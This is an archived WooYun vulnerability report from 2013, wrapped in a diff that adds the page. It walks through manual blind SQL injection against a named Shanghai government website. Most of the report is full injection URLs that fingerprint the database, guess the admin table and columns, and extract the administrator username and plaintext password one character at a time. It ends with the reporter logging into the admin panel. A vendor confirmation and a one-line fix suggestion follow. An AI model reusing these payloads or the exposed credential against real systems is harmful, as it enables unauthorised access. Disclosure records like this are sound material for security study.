@@ -1,0 +1,306 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		上海出入境某分站SQL注入之手工注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		上海出入境某分站SQL注入之手工注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-05-22 14:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-14：	细节向普通白帽子公开<br/>
+									2013-06-24：	细节向实习白帽子公开<br/>
+									2013-07-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">上海出入境某分站SQL注入。and 1=1正常，and 1=2出错。小菜第一次发，求个马，也不懂是否需要在url上遮盖。如有必须，请帮忙遮盖。3Q~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://yangshan.shciq.gov.cn/article.aspx?artid=622 and 1=1 正常<br />
+<br />
+<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and 1=2 不正常<br />
+<br />
+<br />
+<br />
+则确定为注入点 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">接下来用工具跑。跑不出来撒，穿山甲，havij等。Sqlmap跑也总是说连接超时<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/202356375b5a98277155c88319af529bb5311aa5.png" target="_blank"><img src="../images/202356375b5a98277155c88319af529bb5311aa5.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+（后来知道是啥问题了，又用sqlmap，还是能跑出来的）<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+于是只好先手工试试了。<br />
+<br />
+<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 order by 7 是正常的<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+aspx的站，数据库要么是sqlserver，要么是access的吧<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from sysobjects)&gt;0<br />
+<br />
+<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from msysobjects)&gt;0<br />
+<br />
+<br />
+<br />
+第一个URL判断是否是sqlserver数据库，看是否有sysobjects这个表。所以可以判断数据库是access的。<br />
+<br />
+<br />
+<br />
+接下来判断admin表是否存在<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from admin)&gt;=0<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2023573435ae6f8933a5f6f7ca9c963d20c4828a.png" target="_blank"><img src="../images/2023573435ae6f8933a5f6f7ca9c963d20c4828a.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+存在admin表。接下来把count(*)替换成count(字段名)，用同样的原理进行猜解。<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(username) from admin)&gt;=0<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(password) from admin)&gt;=0<br />
+<br />
+这里运气好啊，字段就是username和password，当然可能还有其他字段。<br />
+<br />
+猜字段这里就只能凭经验了，还有一种方法就是去后台登录那里，看源代码，看里面出现的可能是字段名的关键字。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/20235812dd34f0caae88b816fefad48abb413564.png" target="_blank"><img src="../images/20235812dd34f0caae88b816fefad48abb413564.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接下来就是猜字段的值<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 len(username) from admin)&gt;0<br />
+<br />
+原理么就是如果top 1的username长度大于0，则条件成立。我们接着就&gt;1,&gt;2的测下去。一直到&gt;5不成立，则我们就知道username的长度是5<br />
+<br />
+<br />
+<br />
+在的到username的长度之后，用mid(username,N,1)截取第N位字符，再 asc(mid(username,N,1)) 得到 ASCII 码<br />
+<br />
+<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,1,1)) from admin)&gt;96  对<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,1,1)) from admin)&gt;97  错<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,2,1)) from admin)&gt;99  对<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,2,1)) from admin)&gt;100 错<br />
+<br />
+接下来<br />
+<br />
+and (select top 1 asc(mid(username,3,1)) from admin)&gt;108 对<br />
+<br />
+and (select top 1 asc(mid(username,3,1)) from admin)&gt;109 错<br />
+<br />
+and (select top 1 asc(mid(username,4,1)) from admin)&gt;104 对 <br />
+<br />
+and (select top 1 asc(mid(username,4,1)) from admin)&gt;105 错<br />
+<br />
+and (select top 1 asc(mid(username,5,1)) from admin)&gt;109 对<br />
+<br />
+and (select top 1 asc(mid(username,5,1)) from admin)&gt;110 错<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+得到username的值为admin，接下来password的方法也是一样。<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 len(password) from admin)&gt;5 错误，得到password的密码也是5位，以为是admin，去试了下结果不是。然后就是以上同样方法得到password的密码，5位是明文。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(password,1,1)) from admin)&gt;101 对<br />
+<br />
+http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(password,1,1)) from admin)&gt;102 错<br />
+<br />
+…..<br />
+<br />
+以此类推<br />
+<br />
+<br />
+<br />
+最后得到密码为f2wa3<br />
+<br />
+<br />
+<br />
+最后登进后台。之后操作未进行。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2023585290ca963098a94727f0d84b3d88957966.png" target="_blank"><img src="../images/2023585290ca963098a94727f0d84b3d88957966.png" alt="7.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">SQL注入嘛，还是大牛知道怎么补，或者前面可以挂个WAF哦~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024186" title="上海出入境某分站SQL注入之手工注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：11 </p>
+													<p class="detail">确认时间：2013-05-25 21:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现SQL注入情况（用某工具也可以自动注出），已在23日下午转由CNCERT下发上海分中心，由其后续协调网站管理部门处置。<br />
+<br />
+按部分影响机密性、完整性、可用性进行评分，rank=7.48*1.0*1.4=10.472</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24186";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
